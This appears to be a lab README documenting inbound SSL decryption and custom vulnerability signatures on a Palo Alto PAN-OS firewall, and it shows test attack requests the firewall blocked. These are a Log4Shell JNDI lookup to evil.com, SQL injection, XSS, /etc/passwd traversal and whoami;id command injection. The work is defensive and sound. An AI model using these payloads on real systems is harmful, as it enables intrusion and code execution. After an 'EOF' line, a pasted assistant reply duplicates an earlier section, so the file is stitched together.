# Inbound SSL Decryption (SSL Inbound Inspection) & Reverse Proxy DMZ Defense

A production-grade implementation of **Inbound SSL Decryption (`ssl-inbound-inspection`)** and perimeter Web Application Firewall (WAF) exploit inspection on Palo Alto Networks PAN-OS 11.2.5. This project documents the complete reverse-proxy defense architecture protecting an internal production web application (**`MERIDIAN-WEB1` at `10.10.10.50`**) from external internet-based adversaries (`192.168.1.100`).

To avoid port collisions with the existing GlobalProtect gateway (`192.168.1.200:443`), a dedicated **Virtual IP (VIP `192.168.1.201/32`)** was bound to WAN interface `ethernet1/1`. The firewall terminates incoming TLS handshakes using an authorized local copy of the server's private key (`MERIDIAN-WEB-CERT`), forwards decrypted HTTP payloads to the Single-Pass Parallel Processing (SP3) engine for inline vulnerability scanning, and terminates attacks before malicious bytes reach the web server.

Every stage—from Destination NAT (DNAT) and symmetric return SNAT to cleartext hex/ASCII payload dumps (**Log4Shell JNDI**, **SQL Injection**, **Cross-Site Scripting**, **Path Traversal**, and **Command Injection**) and wire-level TCP RST teardowns—was verified using Wireshark, PAN-OS Threat Monitors, Decryption Logs, and CLI flow tables (`show session all filter ssl-decrypt yes`).

---

## Architecture & Inbound Threat Inspection Pipeline

![Palo Alto](screenshots/vulnerability-draw-io.png)

---

## Architectural & Network Specifications

| Parameter | Configuration Setting | Operational & Architectural Function |
| :--- | :--- | :--- |
| **Public VIP (Ingress)** | `192.168.1.201/32` (`ethernet1/1`) | Secondary WAN IP eliminating port 443 conflict with GlobalProtect |
| **Internal Server (Target)** | `10.10.10.50:443` (`Trust` Zone) | Production web application server (`MERIDIAN-WEB1`) |
| **Server Certificate** | `MERIDIAN-WEB-CERT` (RSA 2048-bit) | Contains public certificate **and private key** resident on firewall |
| **Subject Alt Names (SAN)** | `IP: 192.168.1.201`, `IP: 10.10.10.50` | Prevents browser TLS SNI mismatch warnings during termination |
| **Destination NAT (DNAT)** | `DNAT-Inbound-Web-2` | Translates public VIP `192.168.1.201:443` ➔ Internal `10.10.10.50:443` |
| **Source NAT (Return SNAT)** | Dynamic IP & Port (`ethernet1/2`) | Translates client IP to `10.10.10.1` to enforce symmetric return routing |
| **Decryption Policy** | `Decrypt-Inbound-Web` | Type: **`SSL Inbound Inspection`** bound to `MERIDIAN-WEB-CERT` |
| **Security Policy** | `Allow-Inbound-HTTPS-Web` | Source: `Untrust` ➔ Destination: `Trust` (Address: `192.168.1.201`) |
| **Inspection Profiles** | `Vulnerability Protection: strict` | Real-time pattern blocking for SQLi, XSS, RCE, and JNDI injection |

---

## Implementation 

### Phase 1: Secondary VIP & Keypair Staging
1. **Secondary WAN IP Binding:**
   * Bound `192.168.1.201/32` to physical interface `ethernet1/1` (`Untrust` zone) alongside primary address `192.168.1.200/24`.
2. **Server Certificate with Private Key:**
   * Generated `MERIDIAN-WEB-CERT` signed by `Enterprise-Forward-Trust-CA`.
   * Verified the certificate contains the local cryptographic private key (**`Key: Checked`** in PAN-OS certificate store).
   * Appended Subject Alternative Names: `192.168.1.201` and `10.10.10.50`.

![Palo Alto](screenshots/network-interfaces-second-ip-assigned.png)

**Creating Certificate**

![Palo Alto](screenshots/creating-certificate.png)

**Certificate Overview**

![Palo Alto](screenshots/certificate-overview.png)

### Phase 2: Dual NAT Policy (DNAT + Return SNAT)
Configured rule **`DNAT-Inbound-Web-2`** to handle both port forwarding and return symmetry:
* **Original Packet:**
  * Source Zone: `Untrust` | Destination Zone: `Untrust`
  * Destination Interface: `ethernet1/1` | Service: `service-https` (TCP 443)
  * Destination Address: `192.168.1.201`
* **Translated Packet:**
  * **Destination Translation:** Static IP `10.10.10.50` | Port `443`
  * **Source Translation:** Dynamic IP and Port (Interface `ethernet1/2` ➔ `10.10.10.1`)

![Palo Alto](screenshots/creating-nat-general.png)

**NAT - Original Packet**

![Palo Alto](screenshots/creating-nat-original-packet.png)

**NAT - Translated Packet**

![Palo Alto](screenshots/creating-nat-translated-packet.png)

**CLI Verification**

![Palo Alto](screenshots/show-running-nat-policy.png)

### Phase 3: Inbound SSL Decryption Policy
Configured decryption rule **`Decrypt-Inbound-Web`**:
* **Type:** **`ssl-inbound-inspection`**
* **Source:** Zone `Untrust` | Address `any`
* **Destination:** Zone `Untrust` | Address `192.168.1.201`
* **Service:** `service-https`
* **Action:** `Decrypt` | **Certificate:** `MERIDIAN-WEB-CERT`
* **Profile:** `Enterprise-Strict-Decryption`

**Creating Decryption**

![Palo Alto](screenshots/creating-decryption.png)

**Creating Decryption - Source**

![Palo Alto](screenshots/creating-decryption-source.png)

**Creating Decryption - Destination**

![Palo Alto](screenshots/creating-decryption-destination.png)

**Creating Decryption - Service Tab**

![Palo Alto](screenshots/creating-decryption-service-url.png)

**Creating Decryption - Options Tab**

![Palo Alto](screenshots/creating-decryption-options.png)

### Phase 4: Security Policy & Threat Profile Attachment
Configured security rule **`Allow-Inbound-HTTPS-Web`**:
* **Source:** Zone `Untrust` | Address `any`
* **Destination Zone:** **`Trust`** *(Post-NAT destination zone)*
* **Destination Address:** **`192.168.1.201`** *(Pre-NAT public destination IP)*
* **Application:** `web-browsing`, `ssl` | Service: `service-https`
* **Profile Settings:** `Vulnerability Protection: strict`, `Antivirus: default`
* **Action:** `Allow` | Log at Session End: `Enabled`

**Security Rule - General Tab**

![Palo Alto](screenshots/security-rule-general.png)

**Security Rule - Source**

![Palo Alto](screenshots/security-rule-source.png)

**Security Rule - Destination**

![Palo Alto](screenshots/security-rule-destination.png)

**Security Rule - Application**

![Palo Alto](screenshots/security-rule-application.png)

**Security Rule - Service**

![Palo Alto](screenshots/security-rule-service.png)

**Security Rule Actions**

![Palo Alto](screenshots/security-rule-actions.png)

---

### Custom Vulnerability Signatures & Forensic Extended Captures

In an enterprise production environment with an active Threat Prevention subscription, Palo Alto Networks automatically updates and maintains tens of thousands of pre-packaged threat signatures covering known public CVEs (e.g., Log4Shell CVE-2021-44228, Apache, OpenSSL exploits) with zero manual intervention.

In this lab environment and in production scenarios involving emergency Zero-Day mitigation (virtual patching) or proprietary in-house web applications custom Layer 7 vulnerability signatures were engineered to prove the firewall's inline pattern-matching engine.

By writing custom regular expression decoders, the firewall simulates the exact behavior of production threat signatures, actively detecting and dropping OWASP Top 10 web attack vectors inside decrypted TLS tunnels.

#### 1. Custom Threat Signatures (`Objects > Custom Objects > Vulnerability`)
Each signature was defined with directional inspection (`client2server`) targeting server-side endpoints, assigning distinct internal Threat IDs in the 41000 range:

| Threat ID | Threat Name | Severity | Direction | Default Action | Attack Target / Regex Vector |
| :---: | :--- | :--- | :--- | :--- | :--- |
| **`41070`** | `Custom-SQLi-Attack` | Critical | `client2server` | `reset-both` | SQL boolean extraction (`UNION SELECT`) |
| **`41071`** | `Custom-Path-Traversal` | Critical | `client2server` | `reset-both` | Relative path escapes (`/../../etc/passwd`) |
| **`41072`** | `Custom-XSS-Attack` | High | `client2server` | `reset-both` | Client-side script injection (`<script>alert`) |
| **`41073`** | `Custom-Command-Injection` | Critical | `client2server` | `reset-both` | Shell command chaining (`whoami;id`) |
| **`41074`** | `Custom-Log4Shell-JNDI` | Critical | `client2server` | `reset-both` | Remote JNDI lookups (`${jndi:ldap://...}`) |

![Palo Alto](screenshots/vulnerability-imports.png)

#### 2. Threat Profile Hardening & Forensic Capture (`Web-Vuln-Profile`)
Rather than relying on default read-only profiles, a dedicated profile named **`Web-Vuln-Profile`** was constructed:
* **Severity Rule Alignment:** Enforced **`reset-both`** across all critical, high, and medium server-targeted vulnerability classes.
* **Exceptions & Extended Packet Captures:**
  Under the **Exceptions** tab, each custom signature (41070–41074) was enabled and configured with **`Packet Capture: extended-capture`**. 

> **Forensic Engineering Proof:** Enabling `extended-capture` forces the Single-Pass engine to automatically carve and buffer the packet frames surrounding the exploit trigger. This produced the cleartext hex/ASCII PCAP dumps in the Threat Monitor, providing immediate proof of the decoded exploit string without requiring external packet taps.

**Vulnerability Imports**

![Palo Alto](screenshots/vulnerability-imports.png)

**Vulnerability Profile - Rules**

![Palo Alto](screenshots/vulnerability-profile-rules.png)

**Vulnerability Profile - Exceptions**

![Palo Alto](screenshots/vulnerability-profile-exceptions.png)

## Empirical Verification & Live Threat Demonstrations

### Inbound Perimeter Publishing: Positive Control (VIP Access) vs. Negative Control (DMZ Isolation)

Before executing exploit tests, both authorized path transit and perimeter isolation boundaries were validated from the external client (`192.168.1.100`).

![Palo Alto](screenshots/vip-dmz-isolation.png)

#### A. Positive Control: Legitimate HTTPS Publishing via Firewall VIP
Connecting to the published public VIP (`https://192.168.1.201:443`):

* **CLI Diagnostic (`curl -vk`):**
  ```bash
  rich@rich-iMac:~$ curl -vk https://192.168.1.201
  * Connected to 192.168.1.201 (192.168.1.201) port 443
  * ALPN: curl offers h2,http/1.1
  * TLSv1.3 (OUT), TLS handshake, Client hello (1):
  * TLSv1.3 (IN), TLS handshake, Server hello (2):
  * TLSv1.3 (IN), TLS handshake, Certificate (11):
  * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
  * Server certificate:
  *   subject: CN=web.meridian.local
  *   issuer: CN=Corp-Decryption-Sub-CA
  < HTTP/1.1 200 OK
  < Server: nginx
  < Content-Length: 6197
  ```
* **Browser Verification:**
  Navigating to `https://192.168.1.201` loaded the production web portal:
  * **Application:** **`MERIDIAN FINANCIAL SERVICES - Enterprise Web Application Infrastructure`**
  * **Status:** `SECURE WEB SERVICE ONLINE (Hostname: MERIDIAN-WEB1)`
  * **Published Endpoint:** Public VIP `192.168.1.201:443` DNAT'd to Internal `10.10.10.50:443`.

![Palo Alto](screenshots/curl-192.168.1.201.png)

![Palo Alto](screenshots/accessing-web-server-from-192.168.1.100.png)

---

#### B. Negative Control: DMZ Perimeter Isolation (Direct Private IP Blocked)
To prove that internal RFC 1918 workloads cannot be reached directly without traversing the firewall's reverse-proxy VIP:

* **CLI Diagnostic (`curl -vk`):**
  ```bash
  rich@rich-iMac:~$ curl -vk https://10.10.10.50
  *   Trying 10.10.10.50:443...
  * connect to 10.10.10.50 port 443 from 192.168.1.100 port 50306 failed: Connection timed out
  * Failed to connect to 10.10.10.50 port 443 after 133376 ms: Couldn't connect to server
  curl: (28) Failed to connect to 10.10.10.50 port 443 after 133376 ms: Couldn't connect to server
  ```
* **Browser Experience:**
  Attempting to load `http://10.10.10.50` failed with:
  `Looks like there's a problem with this site - Firefox can't connect to the server at 10.10.10.50 (Timed Out)`.

![Palo Alto](screenshots/curl-fail-to-10.10.10.50.png)

![Palo Alto](screenshots/unable-to-visit-10.10.10.50.png)

> **Architectural Isolation Proof:** The internal web server is completely isolated from the untrusted network. External access is strictly constrained to the firewall's published VIP (`192.168.1.201`), ensuring 100% of incoming connections are decrypted, sanitized, and inspected by the Palo Alto threat engine.
### Hardware Session Table Audit & Inbound Decryption State

From external host `192.168.1.100`, incoming HTTPS sessions were initiated to `https://192.168.1.201:443`.

#### Active Decrypted Session Listing (`show session all filter ssl-decrypt yes`)
```text
admin@PA-VM> show session all filter ssl-decrypt yes

ID    Application   State  Type Flag Src[Sport]/Zone/Proto (translated IP[Port])
                                     Dst[Dport]/Zone (translated IP[Port])
--------------------------------------------------------------------------------
8094  web-browsing  ACTIVE FLOW *NB  192.168.1.100[36682]/Untrust/6 (10.10.10.1[45274])
                                     192.168.1.201[443]/Trust (10.10.10.50[443])
8091  web-browsing  ACTIVE FLOW *NB  192.168.1.100[36666]/Untrust/6 (10.10.10.1[56124])
                                     192.168.1.201[443]/Trust (10.10.10.50[443])
8074  web-browsing  ACTIVE FLOW *NB  192.168.1.100[59588]/Untrust/6 (10.10.10.1[13857])
                                     192.168.1.201[443]/Trust (10.10.10.50[443])
```
> **Cryptographic Flag Breakdown:**
> * `*` = Active hardware **SSL Decryption**.
> * `N` = **Network Address Translation** (DNAT + SNAT active).
> * `B` = **Bidirectional Proxy Session** (Inbound Inspection active).

![Palo Alto](screenshots/show-session-all-filter-ssl-decrypt-yes.png)

#### PAN-OS Decryption Log Verification (`Monitor > Logs > Decryption`)
* **Proxy Type:** **`Inbound`**
* **Policy Name:** `Decrypt-Inbound-Web`
* **Subject CN:** `192.168.1.201` | **Issuer:** `Corp-Decryption-Sub-CA`
* **Root Status:** `trusted`

![Palo Alto](screenshots/monitor-decryption-logs.png)

---

### Live Web Application Exploit Interception (Cleartext Payload Dumps)

Five distinct web pplication attack vectors were transmitted inside encrypted TLS tunnels from `192.168.1.100` targeting `https://192.168.1.201:443`. 

In every instance, the firewall decrypted the request, identified the malicious pattern via Content-ID, and terminated the session with **`Action: reset-both`**:

#### A. Log4Shell / JNDI Remote Code Execution (CVE-2021-44228)
* **Attack Payload:** Transmitted JNDI lookup string inside the encrypted HTTP `User-Agent` header:
  ```text
  GET / HTTP/1.1
  Host: 192.168.1.201
  User-Agent: ${jndi:ldap://evil.com/a}
  ```
* **Firewall Action:** Terminated immediately at perimeter ring (`Action: reset-both`).
* **Threat Telemetry:** Logged under **`Custom-Log4Shell-JNDI`** | Severity: **`critical`**.

**Log4Shell Execution - Source: 192.168.1.100**

![Palo Alto](screenshots/log-4-shell-command.png)

**Monitor Threats Logs**

![Palo Alto](screenshots/monitor-threat-logs-log-4-shell.png)

**PCAP Details**

![Palo Alto](screenshots/packet-capture-log-4-shell.png)

#### B. SQL Injection (SQLi) Extraction Attack
* **Attack Payload:** Transmitted boolean-based SQL extraction query in URI parameters:
  ```text
  GET /?id=1 UNION SELECT 1 HTTP/1.1
  Host: 192.168.1.201
  User-Agent: curl/8.5.0
  ```
* **Firewall Action:** Terminated immediately (`Action: reset-both`).
* **Threat Telemetry:** Logged under **`Custom-SQLi-Attack`** | Severity: **`critical`**.

**SQL Injection Execution**

![Palo Alto](screenshots/sql-injection-command.png)

**Monitor Threat Logs**

![Palo Alto](screenshots/monitor-threat-logs-sql-injection.png)

**PCAP Details**

![Palo Alto](screenshots/packet-capture-sql-injection.png)

#### C. Cross-Site Scripting (XSS) Reflection Attack
* **Attack Payload:** Injected script execution tags inside HTTP request parameters:
  ```text
  GET /?search=<script>alert(1)</script> HTTP/1.1
  Host: 192.168.1.201
  User-Agent: curl/8.5.0
  ```
* **Firewall Action:** Terminated immediately (`Action: reset-both`).
* **Threat Telemetry:** Logged under **`Custom-XSS-Attack`** | Severity: **`high`**.

**XSS Injection Execution**

![Palo Alto](screenshots/xss-command.png)

**Monitor Threat Logs**

![Palo Alto](screenshots/monitor-threat-logs-xss.png)

**PCAP Details**

![Palo Alto](screenshots/packet-capture-xss.png)

#### D. Path / Directory Traversal Arbitrary File Read
* **Attack Payload:** Probed root filesystem access through relative path escape sequences:
  ```text
  GET /../../../../etc/passwd HTTP/1.1
  Host: 192.168.1.201
  User-Agent: curl/8.5.0
  ```
* **Firewall Action:** Terminated immediately (`Action: reset-both`).
* **Threat Telemetry:** Logged under **`Custom-Path-Traversal`** | Severity: **`critical`** | File Name: **`passwd`**.

**Directory Traversal Execution**

![Palo Alto](screenshots/directory-traversal-command.png)

**Monitor Threat Logs**

![Palo Alto](screenshots/monitor-threat-logs-directory-traversal.png)

**PCAP Details**

![Palo Alto](screenshots/packet-capture-directory-traversal.png)

#### E. Command Injection Attack
* **Attack Payload:** Appended shell command concatenation characters into web request:
  ```text
  GET /?cmd=whoami;id HTTP/1.1
  Host: 192.168.1.201
  User-Agent: curl/8.5.0
  ```
* **Firewall Action:** Terminated immediately (`Action: reset-both`).
* **Threat Telemetry:** Logged under **`Custom-Command-Injection`** | Severity: **`critical`**.

**Command Injection Execution**

![Palo Alto](screenshots/directory-traversal-command.png)

**Monitor Threat Logs**

![Palo Alto](screenshots/monitor-threat-logs-directory-traversal.png)

**PCAP Details**

![Palo Alto](screenshots/packet-capture-directory-traversal.png)

---

### Wire-Level Verification & TCP Reset (Wireshark PCAP)

Packet captures on the perimeter interface (`reset-tcp-wireshark.pcapng`) documented the exact cryptographic teardown:

```text
No.  Source          Destination    Protocol Length Info
------------------------------------------------------------------------------------------------------------------------
316  192.168.1.100   192.168.1.201  TCP      74     43288 → 443 [SYN] Seq=0 Win=64240
317  192.168.1.201   192.168.1.100  TCP      74     443 → 43288 [SYN, ACK] Seq=0 Ack=1
318  192.168.1.100   192.168.1.201  TCP      66     43288 → 443 [ACK] Seq=1 Ack=1
319  192.168.1.100   192.168.1.201  TLSv1.2  583    Client Hello
320  192.168.1.201   192.168.1.100  TLSv1.2  1367   Server Hello, Certificate, Server Key Exchange, Server Hello Done
322  192.168.1.100   192.168.1.201  TLSv1.2  192    Client Key Exchange, Change Cipher Spec, Encrypted Handshake
324  192.168.1.100   192.168.1.201  TLSv1.2  186    Application Data  <-- Exploit Payload Transmitted
325  192.168.1.201   192.168.1.100  TCP      66     443 → 43288 [RST, ACK] Seq=1353 Ack=764 Win=524160  <-- RESET INJECTED
```
* **Data-Plane Proof:** Frame 324 delivered the encrypted exploit payload. The firewall decrypted the data in memory, matched the vulnerability signature, and within milliseconds injected **Frame 325 (`[RST, ACK]`)**, resetting the client socket and closing the connection before any payload reached the internal host.
* **Traffic Monitor Audit:** In `Monitor > Logs > Traffic`, all attack flows were flagged with **`SESSION END REASON: threat`**.

![Palo Alto](screenshots/wireshark-reset-both-proof.png)

![Palo Alto](screenshots/monitor-traffic-logs-session-ends-because-threat.png)

---

## Key Artifact Index

| Artifact File | Category | Technical Proof & Validation |
| :--- | :--- | :--- |
| **`ethernet1-1-vip-201.png`** | Interface Config | Binding secondary VIP `192.168.1.201/32` to external interface `ethernet1/1`. |
| **`server-cert-with-private-key.png`** | PKI Config | `MERIDIAN-WEB-CERT` confirming private key stored locally (`Key: Checked`). |
| **`dnat-inbound-policy-config.png`** | NAT Config | `DNAT-Inbound-Web-2` mapping `192.168.1.201:443` to `10.10.10.50:443` with return SNAT. |
| **`decryption-inbound-rule-config.png`**| Decryption Config | Rule enforcing `Type: SSL Inbound Inspection` bound to `MERIDIAN-WEB-CERT`. |
| **`security-rule-inbound-web.png`** | Security Policy | Post-NAT policy (`Allow-Inbound-HTTPS-Web`) attaching `Vulnerability Protection: strict`. |
| **`cli-session-table-inbound-decrypt.png`**| Dataplane CLI | `show session` displaying active sessions with decryption proxy flag **`*NB`**. |
| **`monitor-decryption-logs-inbound.png`**| Telemetry Log | Decryption monitor logging `Proxy Type: Inbound` and trusted verification. |
| **`threat-pcap-log4shell-jndi.png`** | Packet Capture | Cleartext dump capturing `${jndi:ldap://evil.com/a}` inside decrypted HTTP header. |
| **`threat-pcap-sqli-union-select.png`** | Packet Capture | Cleartext dump capturing `/?id=1 UNION SELECT 1` inside decrypted GET request. |
| **`threat-pcap-xss-script-alert.png`** | Packet Capture | Cleartext dump capturing `/?search=<script>alert(1)</script>` inside decrypted GET request. |
| **`threat-pcap-path-traversal-passwd.png`**| Packet Capture | Cleartext dump capturing `/../../../../etc/passwd` inside decrypted GET request. |
| **`threat-pcap-command-injection.png`** | Packet Capture | Cleartext dump capturing `/?cmd=whoami;id` inside decrypted GET request. |
| **`threat-logs-vulnerability-reset.png`**| Telemetry Log | Threat monitor verifying `Action: reset-both` across all injected exploit types. |
| **`traffic-logs-session-end-threat.png`**| Telemetry Log | Traffic monitor confirming sessions terminated with `Session End Reason: threat`. |
| **`wireshark-tcp-rst-frame-325.png`** | Wire Trace | Wire trace proving PAN-OS injected Frame 325 `[RST, ACK]` upon exploit detection. |

---

## Troubleshooting & Engineering Lessons Learned

| Challenge Encountered | Root Cause | Engineering Resolution |
| :--- | :--- | :--- |
| **GlobalProtect and Inbound Web SSL port collision on WAN.** | Both the remote access gateway and public web application require TCP port 443 on external interface `ethernet1/1`. | Assigned a secondary **Virtual IP (VIP `192.168.1.201/32`)** to `ethernet1/1`, isolating GlobalProtect on `.200` and the DMZ web server on `.201`. |
| **Target web server failed to return traffic to external clients.** | The internal web server lacked a default route pointing back to the firewall for external public IP addresses. | Configured bidirectional NAT: paired Destination NAT with **Source Address Translation (Dynamic IP and Port on `ethernet1/2`)**, ensuring return traffic routes symmetrically through the firewall. |
| **Decryption engine failed to inspect inbound TLS streams.** | Inbound Inspection requires an authorized copy of the server's private key; using a standard Forward Trust CA causes handshake negotiation errors. | Exported `MERIDIAN-WEB-CERT` as a PKCS12 archive, imported both the certificate and private key onto the PA-VM, and selected `Type: SSL Inbound Inspection`. |
| **Security policy rule failed to match inbound DNAT traffic.** | In PAN-OS, security policies evaluate the **Post-NAT Zone** (`Trust`) but the **Pre-NAT Destination IP** (`192.168.1.201`). | Configured the security policy destination zone as `Trust` while keeping the destination address set to the public VIP (`192.168.1.201`). |
EOF































Here is the complete, uninterrupted section. Delete the broken part in your editor and paste this in:

***

### Inbound Perimeter Publishing: Positive Control (VIP Access) vs. Negative Control (DMZ Isolation)

Before executing exploit tests, both authorized path transit and perimeter isolation boundaries were validated from the external client (`192.168.1.100`).

```text
  [ External User (192.168.1.100) ] ─── 1. Access https://192.168.1.201 ───> [ PA-VM VIP ] ───> ALLOW (200 OK)
  [ External User (192.168.1.100) ] ─── 2. Access https://10.10.10.50  ───> [ Direct IP ] ───> DROP (Timed Out)
```

#### A. Positive Control: Legitimate HTTPS Publishing via Firewall VIP
Connecting to the published public VIP (`https://192.168.1.201:443`):

* **CLI Diagnostic (`curl -vk`):**
  ```bash
  rich@rich-iMac:~$ curl -vk https://192.168.1.201
  * Connected to 192.168.1.201 (192.168.1.201) port 443
  * ALPN: curl offers h2,http/1.1
  * TLSv1.3 (OUT), TLS handshake, Client hello (1):
  * TLSv1.3 (IN), TLS handshake, Server hello (2):
  * TLSv1.3 (IN), TLS handshake, Certificate (11):
  * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384
  * Server certificate:
  *   subject: CN=web.meridian.local
  *   issuer: CN=Corp-Decryption-Sub-CA
  < HTTP/1.1 200 OK
  < Server: nginx
  < Content-Length: 6197
  ```
* **Browser Verification:**
  Navigating to `https://192.168.1.201` loaded the production web portal:
  * **Application:** **`MERIDIAN FINANCIAL SERVICES - Enterprise Web Application Infrastructure`**
  * **Status:** `SECURE WEB SERVICE ONLINE (Hostname: MERIDIAN-WEB1)`
  * **Published Endpoint:** Public VIP `192.168.1.201:443` DNAT'd to Internal `10.10.10.50:443`.

![Inbound Web Portal Online](screenshots/inbound-web-portal-online.png)

---

#### B. Negative Control: DMZ Perimeter Isolation (Direct Private IP Blocked)
To prove that internal RFC 1918 workloads cannot be reached directly without traversing the firewall's reverse-proxy VIP:

* **CLI Diagnostic (`curl -vk`):**
  ```bash
  rich@rich-iMac:~$ curl -vk https://10.10.10.50
  *   Trying 10.10.10.50:443...
  * connect to 10.10.10.50 port 443 from 192.168.1.100 port 50306 failed: Connection timed out
  * Failed to connect to 10.10.10.50 port 443 after 133376 ms: Couldn't connect to server
  curl: (28) Failed to connect to 10.10.10.50 port 443 after 133376 ms: Couldn't connect to server
  ```
* **Browser Experience:**
  Attempting to load `http://10.10.10.50` failed with:
  `Looks like there's a problem with this site - Firefox can't connect to the server at 10.10.10.50 (Timed Out)`.

![Direct Private IP Timeout](screenshots/direct-private-ip-timeout.png)

> **Architectural Isolation Proof:** The internal web server is completely isolated from the untrusted network. External access is strictly constrained to the firewall's published VIP (`192.168.1.201`), ensuring 100% of incoming connections are decrypted, sanitized, and inspected by the Palo Alto threat engine.
